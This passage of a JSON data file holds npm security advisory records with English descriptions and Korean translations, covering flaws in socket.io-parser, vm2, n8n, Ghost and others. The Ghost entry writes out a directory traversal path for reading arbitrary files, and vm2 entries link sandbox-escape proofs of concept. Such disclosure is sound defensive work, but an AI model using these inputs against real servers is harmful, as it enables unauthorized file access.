disclosure.\n",
    "identifiers": "GHSA : GHSA-cqmj-92xf-r6r9\nCVE : CVE-2023-32695",
    "severity": "HIGH",
    "updatedAt": "2023-06-05T21:07:58Z",
    "publishedAt": "2023-05-23T19:55:13Z",
    "references": "https://github.com/socketio/socket.io-parser/security/advisories/GHSA-cqmj-92xf-r6r9\nhttps://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced\nhttps://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3\nhttps://github.com/socketio/socket.io-parser/commit/1c220ddbf45ea4b44bc8dbf6f9ae245f672ba1b9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32695\nhttps://github.com/socketio/socket.io-parser/releases/tag/4.2.3\nhttps://github.com/advisories/GHSA-cqmj-92xf-r6r9",
    "name": "socket.io-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.4, < 4.2.3",
    "identifier": "4.2.3",
    "descriptionKR": "### 영향\n\n특별히 제작된 Socket.IO 패킷은 Socket.IO 서버에서 포착되지 않은 예외를 트리거하여 Node.js 프로세스를 중단시킬 수 있습니다.\n\n```\nTypeError: 개체를 기본 값으로 변환할 수 없습니다.\n       Socket.emit에서(노드:이벤트:507:25)\n       .../node_modules/socket.io/lib/socket.js:531:14에서\n```\n\n### 패치\n\n수정 사항이 오늘(2023/05/22) 릴리스되었습니다.\n\n- https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, `socket.io-parser@4.2.3`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced, `socket.io-parser@3.4.3`에 포함됨\n\n| `socket.io` 버전 | `socket.io-parser` 버전 | 사소한 업데이트가 필요하십니까? |\n|------|------------------------------------------ -------------------------------------------------- ----------------------------|------ ---|\n| `4.5.2...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm 감사 수정`으로 충분해야 합니다 |\n| `4.1.3...4.5.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm 감사 수정`으로 충분해야 합니다 |\n\n\n### 해결 방법\n\n안전한 버전으로 업그레이드하는 것 외에는 알려진 해결 방법이 없습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- 토론 열기 [여기](https://github.com/socketio/socket.io/discussions)\n\n책임 있는 공개에 대해 [@rafax00](https://github.com/rafax00)에게 감사드립니다."
  },
  {
    "description": "### Impact\n\nbignum releases from v0.12.2 to v0.13.0 (inclusive) used node-pre-gyp to optionally download pre-built binary versions of the addon. These binaries were published on a now-expired S3 bucket which has since been claimed by a malicious third party which is now serving binaries containing malware that exfiltrates data from the user's computer.\n\n### Patches\n\nv0.13.1 does not use node-pre-gyp and does not have support for downloading pre-built binaries in any form, avoiding the risk of malicious downloads.",
    "identifiers": "GHSA : GHSA-7cgc-fjv4-52x6",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-24T16:43:58Z",
    "publishedAt": "2023-05-24T16:43:58Z",
    "references": "https://github.com/justmoon/node-bignum/security/advisories/GHSA-7cgc-fjv4-52x6\nhttps://github.com/justmoon/node-bignum/commit/57e48c3f052249725517415d83c7147e4a8c44c8\nhttps://github.com/justmoon/node-bignum/commit/72951c53e7c5c1ac157f04686dc12c3c393b4b08\nhttps://github.com/advisories/GHSA-7cgc-fjv4-52x6",
    "name": "bignum",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.12.2, < 0.13.1",
    "identifier": "0.13.1",
    "descriptionKR": "### 영향\n\nv0.12.2에서 v0.13.0(포함)까지의 bignum 릴리스는 node-pre-gyp를 사용하여 미리 빌드된 애드온 바이너리 버전을 선택적으로 다운로드했습니다. 이 바이너리는 사용자 컴퓨터에서 데이터를 유출하는 맬웨어가 포함된 바이너리를 제공하는 악의적인 제3자가 주장한 현재 만료된 S3 버킷에 게시되었습니다.\n\n### 패치\n\nv0.13.1은 node-pre-gyp를 사용하지 않으며 어떤 형태로든 미리 빌드된 바이너리 다운로드를 지원하지 않아 악의적인 다운로드의 위험을 방지합니다."
  },
  {
    "description": "### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot convert object to primitive value\n       at Socket.emit (node:events:507:25)\n       at .../node_modules/socket.io/lib/socket.js:531:14\n```\n\n### Patches\n\nA fix has been released today (2023/05/22):\n\n- https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, included in `socket.io-parser@4.2.3`\n- https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced, included in `socket.io-parser@3.4.3`\n\n| `socket.io` version | `socket.io-parser` version                                                                              | Needs minor update?                  |\n|---------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|\n| `4.5.2...latest`    | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm audit fix` should be sufficient |\n| `4.1.3...4.5.1`     | `~4.1.1` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.5...4.1.2`     | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.0...3.0.4`     | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Please upgrade to `socket.io@4.6.x`  |\n| `2.3.0...2.5.0`     | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm audit fix` should be sufficient |\n\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https://github.com/socketio/socket.io/discussions)\n\nThanks to [@rafax00](https://github.com/rafax00) for the responsible disclosure.\n",
    "identifiers": "GHSA : GHSA-cqmj-92xf-r6r9\nCVE : CVE-2023-32695",
    "severity": "HIGH",
    "updatedAt": "2023-06-05T21:07:58Z",
    "publishedAt": "2023-05-23T19:55:13Z",
    "references": "https://github.com/socketio/socket.io-parser/security/advisories/GHSA-cqmj-92xf-r6r9\nhttps://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced\nhttps://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3\nhttps://github.com/socketio/socket.io-parser/commit/1c220ddbf45ea4b44bc8dbf6f9ae245f672ba1b9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32695\nhttps://github.com/socketio/socket.io-parser/releases/tag/4.2.3\nhttps://github.com/advisories/GHSA-cqmj-92xf-r6r9",
    "name": "socket.io-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.4.0, < 3.4.3",
    "identifier": "3.4.3",
    "descriptionKR": "### 영향\n\n특별히 제작된 Socket.IO 패킷은 Socket.IO 서버에서 포착되지 않은 예외를 트리거하여 Node.js 프로세스를 중단시킬 수 있습니다.\n\n```\nTypeError: 개체를 기본 값으로 변환할 수 없습니다.\n       Socket.emit에서(노드:이벤트:507:25)\n       .../node_modules/socket.io/lib/socket.js:531:14에서\n```\n\n### 패치\n\n수정 사항이 오늘(2023/05/22) 릴리스되었습니다.\n\n- https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, `socket.io-parser@4.2.3`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced, `socket.io-parser@3.4.3`에 포함됨\n\n| `socket.io` 버전 | `socket.io-parser` 버전 | 사소한 업데이트가 필요하십니까? |\n|------|------------------------------------------ -------------------------------------------------- ----------------------------|------ ---|\n| `4.5.2...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm 감사 수정`으로 충분해야 합니다 |\n| `4.1.3...4.5.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | `socket.io@4.6.x`로 업그레이드하십시오 |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm 감사 수정`으로 충분해야 합니다 |\n\n\n### 해결 방법\n\n안전한 버전으로 업그레이드하는 것 외에는 알려진 해결 방법이 없습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- 토론 열기 [여기](https://github.com/socketio/socket.io/discussions)\n\n책임 있는 공개에 대해 [@rafax00](https://github.com/rafax00)에게 감사드립니다."
  },
  {
    "description": "### Impact\n\nPotential for cross-site scripting in `posthog-js`.\n\n### Patches\n\nThe problem has been patched in `posthog-js` version 1.57.2.\n\n### Workarounds\n\n- This isn't an issue for sites that have a Content Security Policy in place.\n- Using the HTML tracking snippet on PostHog Cloud always guarantees the latest version of the library – in that case no action is required to upgrade to the patched version.\n\n### References\n\nWe will publish details of the vulnerability in 30 days as per our [security policy](https://posthog.com/handbook/company/security#policies).\n",
    "identifiers": "GHSA : GHSA-8775-5hwv-wr6v\nCVE : CVE-2023-32325",
    "severity": "MODERATE",
    "updatedAt": "2023-05-29T16:13:03Z",
    "publishedAt": "2023-05-22T20:35:03Z",
    "references": "https://github.com/PostHog/posthog-js/security/advisories/GHSA-8775-5hwv-wr6v\nhttps://github.com/PostHog/posthog-js/pull/630\nhttps://github.com/PostHog/posthog-js/commit/67e07eb8bb271a3a6f4aa251382e4d25abb385a0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32325\nhttps://github.com/advisories/GHSA-8775-5hwv-wr6v",
    "name": "posthog-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.57.2",
    "identifier": "1.57.2",
    "descriptionKR": "### 영향\n\n`posthog-js`의 교차 사이트 스크립팅 가능성.\n\n### 패치\n\n이 문제는 `posthog-js` 버전 1.57.2에서 패치되었습니다.\n\n### 해결 방법\n\n- 콘텐츠 보안 정책이 있는 사이트에서는 문제가 되지 않습니다.\n- PostHog Cloud에서 HTML 추적 스니펫을 사용하면 항상 라이브러리의 최신 버전이 보장됩니다. 이 경우 패치된 버전으로 업그레이드하기 위한 조치가 필요하지 않습니다.\n\n### 참조\n\n[보안 정책](https://posthog.com/handbook/company/security#policies)에 따라 30일 이내에 취약성에 대한 세부 정보를 게시할 예정입니다."
  },
  {
    "description": "### Impact\n\nThe Parse Server Push Adapter can crash Parse Server due to an invalid push notification payload.\n\n### Patches\n\nInvalid push notification payload is caught and an logged.\n\n### Workarounds\nn/a\n\n### References\n- https://github.com/parse-community/parse-server-push-adapter/security/advisories/GHSA-mxhg-rvwx-x993\n- https://github.com/parse-community/parse-server-push-adapter/pull/217",
    "identifiers": "GHSA : GHSA-mxhg-rvwx-x993\nCVE : CVE-2023-32688",
    "severity": "MODERATE",
    "updatedAt": "2023-05-30T06:47:40Z",
    "publishedAt": "2023-05-22T19:50:04Z",
    "references": "https://github.com/parse-community/parse-server-push-adapter/security/advisories/GHSA-mxhg-rvwx-x993\nhttps://github.com/parse-community/parse-server-push-adapter/pull/217\nhttps://github.com/parse-community/parse-server-push-adapter/commit/598cb84d0866b7c5850ca96af920e8cb5ba243ec\nhttps://github.com/parse-community/parse-server-push-adapter/releases/tag/4.1.3\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32688\nhttps://github.com/advisories/GHSA-mxhg-rvwx-x993",
    "name": "parse-server-push-adapter",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.3",
    "identifier": "4.1.3",
    "descriptionKR": "### 영향\n\nParse Server 푸시 어댑터는 잘못된 푸시 알림 페이로드로 인해 Parse Server를 충돌시킬 수 있습니다.\n\n### 패치\n\n잘못된 푸시 알림 페이로드가 포착되고 기록됩니다.\n\n### 해결 방법\n해당 없음\n\n### 참조\n- https://github.com/parse-community/parse-server-push-adapter/security/advisories/GHSA-mxhg-rvwx-x993\n- https://github.com/parse-community/parse-server-push-adapter/pull/217"
  },
  {
    "description": "iden3 snarkjs through 0.6.11 allows double spending because there is no validation that the publicSignals length is less than the field modulus.",
    "identifiers": "GHSA : GHSA-xp5g-jhg3-3rg2\nCVE : CVE-2023-33252",
    "severity": "HIGH",
    "updatedAt": "2023-05-30T23:12:13Z",
    "publishedAt": "2023-05-22T00:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-33252\nhttps://github.com/iden3/snarkjs/commits/master/src/groth16_verify.js\nhttps://github.com/iden3/snarkjs/tags\nhttps://github.com/advisories/GHSA-xp5g-jhg3-3rg2",
    "name": "snarkjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.6.11",
    "descriptionKR": "0.6.11까지의 iden3 snarkjs는 publicSignals 길이가 필드 모듈러스보다 작다는 검증이 없기 때문에 이중 지출을 허용합니다."
  },
  {
    "description": "Squirrelly is a template engine implemented in JavaScript that works out of the box with ExpressJS. Squirrelly mixes pure template data with engine configuration options through the Express render API. By overwriting internal configuration options remote code execution may be triggered in downstream applications. Version 9.0.0 has a fix for this issue. For complete details refer to the referenced GHSL-2021-023.",
    "identifiers": "GHSA : GHSA-q8j6-pwqx-pm96\nCVE : CVE-2021-32819",
    "severity": "HIGH",
    "updatedAt": "2023-05-22T18:12:25Z",
    "publishedAt": "2021-05-17T20:58:02Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32819\nhttps://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/\nhttps://github.com/squirrellyjs/squirrelly/pull/254\nhttps://github.com/squirrellyjs/squirrelly/commit/c12418a026f73df645ba927fd29358efe02fed1e\nhttps://github.com/squirrellyjs/squirrelly/commit/dca7a1e7ee91d8a6ffffb655f3f15647486db9da\nhttps://github.com/advisories/GHSA-q8j6-pwqx-pm96",
    "name": "squirrelly",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 8.0.8",
    "identifier": "9.0.0",
    "descriptionKR": "Squirrelly는 ExpressJS와 함께 기본적으로 작동하는 JavaScript로 구현된 템플릿 엔진입니다. Squirrelly는 Express 렌더링 API를 통해 순수한 템플릿 데이터를 엔진 구성 옵션과 혼합합니다. 내부 구성 옵션을 덮어쓰면 다운스트림 애플리케이션에서 원격 코드 실행이 트리거될 수 있습니다. 버전 9.0.0에는 이 문제에 대한 수정 사항이 있습니다. 자세한 내용은 참조된 GHSL-2021-023을 참조하십시오."
  },
  {
    "description": "In versions 3.9.17 and lower of vm2 it was possible to get a read-write reference to the node `inspect` method and edit options for `console.log`.\n\n### Impact\nA threat actor can edit options for `console.log`.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.18` of `vm2`.\n\n### Workarounds\nAfter creating a vm make the `inspect` method readonly with `vm.readonly(inspect)`.\n\n### References\nPoC - https://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to @arkark (Takeshi Kaneko) of GMO Cybersecurity by Ierae, Inc. for disclosing this vulnerability.",
    "identifiers": "GHSA : GHSA-p5gc-c584-jj6v\nCVE : CVE-2023-32313",
    "severity": "MODERATE",
    "updatedAt": "2023-05-17T03:49:38Z",
    "publishedAt": "2023-05-17T03:49:37Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-p5gc-c584-jj6v\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32313\nhttps://github.com/patriksimek/vm2/commit/5206ba25afd86ef547a2c9d48d46ca7a9e6ec238\nhttps://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550\nhttps://github.com/patriksimek/vm2/releases/tag/3.9.18\nhttps://github.com/advisories/GHSA-p5gc-c584-jj6v",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.18",
    "identifier": "3.9.18",
    "descriptionKR": "vm2의 3.9.17 이하 버전에서는 노드 `inspect` 메서드에 대한 읽기-쓰기 참조를 가져오고 `console.log`에 대한 옵션을 편집할 수 있었습니다.\n\n### 영향\n위협 행위자는 `console.log`에 대한 옵션을 편집할 수 있습니다.\n\n### 패치\n이 취약점은 `vm2`의 `3.9.18` 버전 릴리스에서 패치되었습니다.\n\n### 해결 방법\nvm을 생성한 후 `vm.readonly(inspect)`를 사용하여 `inspect` 메서드를 읽기 전용으로 만듭니다.\n\n### 참조\nPoC - https://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기\n\n이 취약점을 공개한 Ierae, Inc.의 GMO Cybersecurity의 @arkark(Takeshi Kaneko)에게 감사드립니다."
  },
  {
    "description": "A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of `Proxy`.\n\n### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.18` of `vm2`.\n\n### Workarounds\nNone.\n\n### References\nPoC - https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to @arkark (Takeshi Kaneko) of GMO Cybersecurity by Ierae, Inc. for disclosing this vulnerability.",
    "identifiers": "GHSA : GHSA-whpj-8f3w-67p5\nCVE : CVE-2023-32314",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-15T21:39:13Z",
    "publishedAt": "2023-05-15T20:50:51Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-whpj-8f3w-67p5\nhttps://github.com/patriksimek/vm2/commit/d88105f99752305c5b8a77b63ddee3ec86912daf\nhttps://github.com/patriksimek/vm2/releases/tag/3.9.18\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32314\nhttps://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac\nhttps://github.com/advisories/GHSA-whpj-8f3w-67p5",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.18",
    "identifier": "3.9.18",
    "descriptionKR": "버전 3.9.17까지의 vm2에 샌드박스 이스케이프 취약점이 존재합니다. 'Proxy' 사양을 기반으로 예기치 않은 호스트 개체 생성을 남용합니다.\n\n### 영향\n공격자는 샌드박스 보호를 우회하여 샌드박스를 실행하는 호스트에서 원격 코드 실행 권한을 얻을 수 있습니다.\n\n### 패치\n이 취약점은 `vm2`의 `3.9.18` 버전 릴리스에서 패치되었습니다.\n\n### 해결 방법\n없음.\n\n### 참조\nPoC - https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기\n\n이 취약점을 공개한 Ierae, Inc.의 GMO Cybersecurity의 @arkark(Takeshi Kaneko)에게 감사드립니다."
  },
  {
    "description": "### Impact\nPrior to version v1.20230419.0, the FormData API implementation was subject to an integer overflow. If a FormData instance contained more than 2^31 elements, the `forEach()` method could end up reading from the wrong location in memory while iterating over elements. This would most likely lead to a segmentation fault, but could theoretically allow arbitrary undefined behavior.\n\nIn order for the bug to be exploitable, the process would need to be able to allocate 160GB of RAM. Due to this, the bug was never exploitable on the Cloudflare Workers platform, but could theoretically be exploitable on deployments of workerd running on machines with a huge amount of memory. Moreover, in order to be remotely exploited, an attacker would have to upload a single form-encoded HTTP request of at least tens of gigabytes in size. The application code would then have to use `request.formData()` to parse the request and `formData.forEach()` to iterate over this data. Due to these limitations, the exploitation likelihood was considered Low.\n\n### Patches\nA fix that addresses this vulnerability has been released in version v1.20230419.0 and users are encouraged to update to the latest version available.\n\n### References\nRelease - https://github.com/cloudflare/workerd/releases/tag/v1.20230419.0",
    "identifiers": "GHSA : GHSA-8vx6-69vg-c46f\nCVE : CVE-2023-2512",
    "severity": "MODERATE",
    "updatedAt": "2023-05-26T21:51:48Z",
    "publishedAt": "2023-05-12T20:16:38Z",
    "references": "https://github.com/cloudflare/workerd/security/advisories/GHSA-8vx6-69vg-c46f\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-2512\nhttps://github.com/cloudflare/workerd/releases/tag/v1.20230419.0\nhttps://github.com/advisories/GHSA-8vx6-69vg-c46f",
    "name": "workerd",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.20230419.0",
    "identifier": "1.20230419.0",
    "descriptionKR": "### 영향\n버전 v1.20230419.0 이전에는 FormData API 구현에 정수 오버플로가 있었습니다. FormData 인스턴스에 2^31개 이상의 요소가 포함된 경우 `forEach()` 메서드는 요소를 반복하는 동안 메모리의 잘못된 위치에서 읽게 될 수 있습니다. 이는 세그먼테이션 오류로 이어질 가능성이 높지만 이론적으로 임의의 정의되지 않은 동작을 허용할 수 있습니다.\n\n버그를 악용할 수 있으려면 프로세스에서 160GB의 RAM을 할당할 수 있어야 합니다. 이로 인해 이 버그는 Cloudflare Workers 플랫폼에서 결코 악용될 수 없었지만 이론적으로 엄청난 양의 메모리가 있는 컴퓨터에서 실행되는 workerd 배포에서는 악용될 수 있습니다. 또한 공격자가 원격으로 악용되려면 최소 수십 기가바이트 크기의 단일 양식 인코딩 HTTP 요청을 업로드해야 합니다. 애플리케이션 코드는 요청을 구문 분석하기 위해 `request.formData()`를 사용하고 이 데이터를 반복하기 위해 `formData.forEach()`를 사용해야 합니다. 이러한 제한으로 인해 악용 가능성은 낮음으로 간주되었습니다.\n\n### 패치\n이 취약점을 해결하는 수정 사항이 버전 v1.20230419.0에서 릴리스되었으며 사용자는 사용 가능한 최신 버전으로 업데이트하는 것이 좋습니다.\n\n### 참조\n릴리스 - https://github.com/cloudflare/workerd/releases/tag/v1.20230419.0"
  },
  {
    "description": "The n8n package prior to 0.216.1 for Node.js allows Information Disclosure.",
    "identifiers": "GHSA : GHSA-r9xw-p7wj-w792\nCVE : CVE-2023-27564",
    "severity": "HIGH",
    "updatedAt": "2023-06-22T17:25:38Z",
    "publishedAt": "2023-05-10T15:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-27564\nhttps://github.com/n8n-io/n8n/releases\nhttps://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-N8N-Multiple-Vulnerabilities_0.pdf\nhttps://github.com/n8n-io/n8n/releases/tag/n8n%400.216.1\nhttps://security.netapp.com/advisory/ntap-20230622-0007/\nhttps://github.com/advisories/GHSA-r9xw-p7wj-w792",
    "name": "n8n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.216.1",
    "identifier": "0.216.1",
    "descriptionKR": "Node.js용 0.216.1 이전의 n8n 패키지는 정보 공개를 허용합니다."
  },
  {
    "description": "The n8n package prior to 0.216.1 for Node.js allows Escalation of Privileges.",
    "identifiers": "GHSA : GHSA-97cp-mr4m-9mcf\nCVE : CVE-2023-27563",
    "severity": "HIGH",
    "updatedAt": "2023-06-22T17:25:33Z",
    "publishedAt": "2023-05-10T15:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-27563\nhttps://github.com/n8n-io/n8n/releases\nhttps://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-N8N-Multiple-Vulnerabilities_0.pdf\nhttps://github.com/n8n-io/n8n/releases/tag/n8n%400.216.1\nhttps://security.netapp.com/advisory/ntap-20230622-0007/\nhttps://github.com/advisories/GHSA-97cp-mr4m-9mcf",
    "name": "n8n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.216.1",
    "identifier": "0.216.1",
    "descriptionKR": "Node.js용 0.216.1 이전의 n8n 패키지는 권한 상승을 허용합니다."
  },
  {
    "description": "The n8n package prior to version 0.216.1 for Node.js allows Directory Traversal.",
    "identifiers": "GHSA : GHSA-p58x-7733-vp9m\nCVE : CVE-2023-27562",
    "severity": "MODERATE",
    "updatedAt": "2023-06-22T17:25:28Z",
    "publishedAt": "2023-05-10T15:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-27562\nhttps://github.com/n8n-io/n8n/releases\nhttps://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-N8N-Multiple-Vulnerabilities_0.pdf\nhttps://github.com/n8n-io/n8n/releases/tag/n8n%400.216.1\nhttps://security.netapp.com/advisory/ntap-20230622-0007/\nhttps://github.com/advisories/GHSA-p58x-7733-vp9m",
    "name": "n8n",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.216.1",
    "identifier": "0.216.1",
    "descriptionKR": "Node.js용 버전 0.216.1 이전의 n8n 패키지는 디렉터리 순회를 허용합니다."
  },
  {
    "description": "All versions of the package m.static are vulnerable to Directory Traversal due to improper input sanitization of the path being requested via the requestFile function.",
    "identifiers": "GHSA : GHSA-vcxh-qvgr-9fw9\nCVE : CVE-2023-26126",
    "severity": "HIGH",
    "updatedAt": "2023-05-17T12:59:17Z",
    "publishedAt": "2023-05-10T06:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26126\nhttps://gist.github.com/lirantal/dcb32c11ce87f5aafd2282b90b4dc998\nhttps://security.snyk.io/vuln/SNYK-JS-MSTATIC-3244915\nhttps://github.com/ivoputzer/m.static/blob/master/index.js#L19\nhttps://github.com/advisories/GHSA-vcxh-qvgr-9fw9",
    "name": "m.static",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.2.0",
    "descriptionKR": "패키지 m.static의 모든 버전은 requestFile 함수를 통해 요청되는 경로의 부적절한 입력 삭제로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "jsreport prior to 3.11.3 had a version of vm2 vulnerable to CVE-2023-29017 hard coded in the package.json of the jsreport-core component. An attacker can use this vulnerability to obtain the authority of the jsreport playground server, or construct a malicious webpage/html file and send it to the user to attack the installed jsreport client.",
    "identifiers": "GHSA : GHSA-g7rj-q722-245g\nCVE : CVE-2023-2583",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-15T13:43:16Z",
    "publishedAt": "2023-05-08T18:30:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2583\nhttps://github.com/jsreport/jsreport/commit/afaff3804b34b38e959f5ae65f9e672088de13d7\nhttps://huntr.dev/bounties/397ea68d-1e28-44ff-b830-c8883d067d96\nhttps://github.com/jsreport/jsreport/releases/tag/3.11.3\nhttps://github.com/advisories/GHSA-g7rj-q722-245g",
    "name": "jsreport",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.11.3",
    "identifier": "3.11.3",
    "descriptionKR": "3.11.3 이전의 jsreport에는 jsreport-core 구성 요소의 package.json에 하드 코딩된 CVE-2023-29017에 취약한 vm2 버전이 있습니다. 공격자는 이 취약점을 악용하여 jsreport 플레이그라운드 서버의 권한을 획득하거나 악성 웹페이지/html 파일을 구성하여 사용자에게 전송하여 설치된 jsreport 클라이언트를 공격할 수 있습니다."
  },
  {
    "description": "Ghost before 5.42.1 allows remote attackers to read arbitrary files within the active theme's folder via /assets/built%2F..%2F..%2F/ directory traversal. This occurs in frontend/web/middleware/static-theme.js.",
    "identifiers": "GHSA : GHSA-wf7x-fh6w-34r6\nCVE : CVE-2023-32235",
    "severity": "HIGH",
    "updatedAt": "2023-05-11T20:55:35Z",
    "publishedAt": "2023-05-05T06:30:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-32235\nhttps://github.com/TryGhost/Ghost/commit/378dd913aa8d0fd0da29b0ffced8884579598b0f\nhttps://github.com/TryGhost/Ghost/compare/v5.42.0...v5.42.1\nhttps://github.com/advisories/GHSA-wf7x-fh6w-34r6",
    "name": "ghost",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.42.1",
    "identifier": "5.42.1",
    "descriptionKR": "5.42.1 이전의 Ghost는 원격 공격자가 /assets/built%2F..%2F..%2F/ 디렉토리 순회를 통해 활성 테마 폴더 내의 임의 파일을 읽을 수 있도록 허용합니다. 이것은 frontend/web/middleware/static-theme.js에서 발생합니다."
  },
  {
